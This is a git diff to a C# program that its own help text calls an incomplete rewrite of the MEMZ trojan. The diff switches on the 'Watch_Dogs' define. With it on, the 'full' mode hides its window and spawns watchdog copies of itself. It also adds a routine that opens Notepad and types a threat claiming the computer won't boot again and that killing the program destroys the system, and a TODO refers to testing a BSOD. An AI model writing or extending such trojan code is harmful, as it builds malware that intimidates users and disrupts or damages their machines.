@@ -1,14 +1,16 @@
-﻿using System;
+﻿#define Watch_Dogs
+
+using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Linq;
 using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
-using CC_Functions.W32;
 using GlitchPayloads;
-
-//#define Watch_Dogs
+#if Watch_Dogs
+using System.Diagnostics;
+using CC_Functions.W32;
+#endif
 
 namespace Glitch
 {
@@ -46,8 +48,9 @@ namespace Glitch
                         string.Join(Environment.NewLine, payloads.Select(s => s.GetPayloadName())));
                     break;
                 case "full":
+                    ShowNotepad();
                     payloads.ForEach(s => new Thread(() => s.Invoke(null, new object[0])).Start());
-#if !Watch_Dogs
+#if Watch_Dogs
                     Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
                     for (int i = 0; i < WatchDog.WDC; i++)
                         Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
@@ -84,22 +87,46 @@ namespace Glitch
 
         private static void ShowHelp()
         {
-            Console.WriteLine(@"CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#
-Usage: Glitch <command> [parameters]
-
-Commands:
--   form: Shows a GUI to customize payloads (Memz Clean). Default
--   help: Displays this message
--   list: Lists all payloads
--   full: Runs all payloads. This is the only option that includes WatchDogs
--   run:  Run only the payloads specified in parameters");
-#if Watch_Dogs
-            Console.WriteLine("-   wd:   This is used internally and should not be used from outside");
+            Console.WriteLine("CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#"
+#if DEBUG
+                              + " - DEBUG BUILD"
 #endif
+            );
+            Console.WriteLine("Usage: Glitch <command> [parameters]");
+            Console.WriteLine("");
+            Console.WriteLine("Commands:");
+            Console.WriteLine("-   form: Shows a GUI to customize payloads (Memz Clean). Default.");
+            Console.WriteLine("-   help: Displays this message");
+            Console.WriteLine("-   list: Lists all payloads");
+            Console.WriteLine("-   run:  Run only the payloads specified in parameters");
+#if Watch_Dogs
+            Console.WriteLine("-   full: Runs all payloads. Includes Watchdogs");
+#else
+            Console.WriteLine("-   full: Runs all payloads");
+#endif
+#if Watch_Dogs
+            Console.WriteLine("-   wd:   This is used internally and should never be used from outside");
+#endif
+        }
+
+        private static void ShowNotepad()
+        {
+            Process proc = Process.Start("notepad.exe");
+            proc.WaitForInputIdle();
+            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
+            string msg = @"YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.
+
+Your computer won't boot up again,
+so use it as long as you can!
+
+:D
+
+Trying to kill MEMZ will cause your system to be
+destroyed instantly, so don't try it :D";
+            SendKeys.SendWait(msg);
         }
     }
 }
 
-//TODO: Funciton to build custom payload collections
-//TODO: Show notepad
-//TODO: Test WD
+//TODO: Function to build custom payload collections
+//TODO: Test BSOD
